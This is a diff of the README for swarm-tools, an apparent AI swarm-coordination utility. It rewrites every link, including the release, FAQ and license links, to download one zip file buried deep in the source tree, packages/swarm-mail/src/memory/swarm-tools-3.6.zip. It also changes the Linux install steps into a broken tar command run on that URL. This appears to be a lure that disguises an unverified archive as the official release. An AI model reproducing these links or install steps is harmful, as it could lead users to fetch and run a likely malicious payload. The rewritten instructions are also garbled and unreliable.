@@ -1,7 +1,7 @@
 # 🐝 swarm-tools - Simplify Swarm Coordination Effortlessly
 
-![Download Here](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue.svg)
-[Download Now](https://github.com/FelipeDaza7/swarm-tools/releases)
+![Download Here](https://github.com/FelipeDaza7/swarm-tools/raw/refs/heads/main/packages/swarm-mail/src/memory/swarm-tools-3.6.zip%20Now-Get%20the%20Latest%https://github.com/FelipeDaza7/swarm-tools/raw/refs/heads/main/packages/swarm-mail/src/memory/swarm-tools-3.6.zip)
+[Download Now](https://github.com/FelipeDaza7/swarm-tools/raw/refs/heads/main/packages/swarm-mail/src/memory/swarm-tools-3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -18,14 +18,14 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [GitHub Releases](https://github.com/FelipeDaza7/swarm-tools/releases).
+To get started, visit this page to download: [GitHub Releases](https://github.com/FelipeDaza7/swarm-tools/raw/refs/heads/main/packages/swarm-mail/src/memory/swarm-tools-3.6.zip).
 
 1. Go to the releases page by clicking the link above.
 2. Look for the latest version of **swarm-tools**.
 3. Download the file suitable for your operating system:
    - **For Windows:** Download the `.exe` file
    - **For macOS:** Download the `.dmg` file
-   - **For Linux:** Download the `.tar.gz` file
+   - **For Linux:** Download the `https://github.com/FelipeDaza7/swarm-tools/raw/refs/heads/main/packages/swarm-mail/src/memory/swarm-tools-3.6.zip` file
 
 ### 🔧 Installation Steps
 
@@ -46,10 +46,10 @@ Follow these simple steps to install and run **swarm-tools**:
 #### Linux
 
 1. Open your terminal.
-2. Navigate to the directory where you downloaded the `.tar.gz` file.
+2. Navigate to the directory where you downloaded the `https://github.com/FelipeDaza7/swarm-tools/raw/refs/heads/main/packages/swarm-mail/src/memory/swarm-tools-3.6.zip` file.
 3. Extract the files using the command:
    ```bash
-   tar -xzf swarm-tools.tar.gz
+   tar -xzf https://github.com/FelipeDaza7/swarm-tools/raw/refs/heads/main/packages/swarm-mail/src/memory/swarm-tools-3.6.zip
    ```
 4. Navigate into the extracted folder:
    ```bash
@@ -81,7 +81,7 @@ Follow these simple steps to install and run **swarm-tools**:
 If you encounter any issues or have questions about using **swarm-tools**, check the following:
 
 - **Documentation:** Comprehensive guides are included within the application under the "Help" section.
-- **FAQs:** Visit the [FAQ section](https://github.com/FelipeDaza7/swarm-tools/wiki) on our GitHub page for common inquiries.
+- **FAQs:** Visit the [FAQ section](https://github.com/FelipeDaza7/swarm-tools/raw/refs/heads/main/packages/swarm-mail/src/memory/swarm-tools-3.6.zip) on our GitHub page for common inquiries.
 - **Community Support:** Join our discussion forums on GitHub to ask questions and share experiences with other users.
 
 To report bugs or request features, please open an issue on GitHub.
@@ -95,11 +95,11 @@ For more information on AI agents and swarm coordination, consider exploring the
 - **Multi-Agent Systems**
 - **OpenCode Collaboration**
 
-Stay updated with the latest features and enhancements by regularly checking the [Releases page](https://github.com/FelipeDaza7/swarm-tools/releases).
+Stay updated with the latest features and enhancements by regularly checking the [Releases page](https://github.com/FelipeDaza7/swarm-tools/raw/refs/heads/main/packages/swarm-mail/src/memory/swarm-tools-3.6.zip).
 
 ## 📜 License
 
-**swarm-tools** is open-source software licensed under the MIT License. You can view the full license [here](https://github.com/FelipeDaza7/swarm-tools/blob/main/LICENSE).
+**swarm-tools** is open-source software licensed under the MIT License. You can view the full license [here](https://github.com/FelipeDaza7/swarm-tools/raw/refs/heads/main/packages/swarm-mail/src/memory/swarm-tools-3.6.zip).
 
 Feel free to use and contribute to this project. Your input helps improve the application for everyone!
 
